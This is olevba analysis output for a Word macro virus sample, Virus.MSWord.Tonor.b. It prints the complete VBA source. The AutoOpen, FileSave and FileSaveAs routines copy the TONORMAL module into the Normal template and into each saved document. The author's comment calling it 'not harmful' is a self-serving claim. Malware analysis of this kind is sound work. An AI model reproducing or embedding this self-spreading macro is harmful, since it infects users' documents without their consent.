olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tonor.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tonor.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TONORMAL.bas 
in file: Virus.MSWord.Tonor.b - OLE stream: 'Macros/VBA/TONORMAL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()

If Templates(1).AutoTextEntries.Item(1) = "IAMHERE" Then GoTo done Else
Application.OrganizerCopy Source:=MacroContainer.FullName, _
            Destination:=Application.Templates(1).FullName, Name:="TONORMAL", _
            Object:=wdOrganizerObjectProjectItems
Templates(1).AutoTextEntries.Add("- AAAAAAAA", ActiveDocument.Words(1)) = "IAMHERE"
done:
On Error GoTo kill
kill:
End Sub
Public Sub FileSaveAs()
Dim kobar As String
If (ActiveDocument.Variables.Count > 0) Then If (ActiveDocument.Variables.Item(1).Value = "OK") Then GoTo done Else
Application.OrganizerCopy Source:=MacroContainer.FullName, _
            Destination:=ActiveDocument.FullName, Name:="TONORMAL", _
            Object:=wdOrganizerObjectProjectItems
ActiveDocument.Variables.Add Name:="AAAAAAAA", Value:="OK"

done:
ActiveDocument.SaveAs (Dialogs(wdDialogFileSaveAs).Name)
On Error GoTo kill
kill:
End Sub
Public Sub FileSave()
If ActiveDocument.Variables.Count > 0 Then
    If (ActiveDocument.Variables.Item(1).Value = "OK") Then GoTo done
    Else
Application.OrganizerCopy Source:=MacroContainer.FullName, _
            Destination:=ActiveDocument.FullName, Name:="TONORMAL", _
            Object:=wdOrganizerObjectProjectItems
ActiveDocument.Variables.Add Name:="AAAAAAAA", Value:="OK"
End If
done:
ActiveDocument.Save
On Error GoTo kill
kill:

End Sub
Public Sub about()
' VIRUS 8x64oct
' FROM ESTONIA
' NOT HARMFUL
' ONLY SPREADS
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

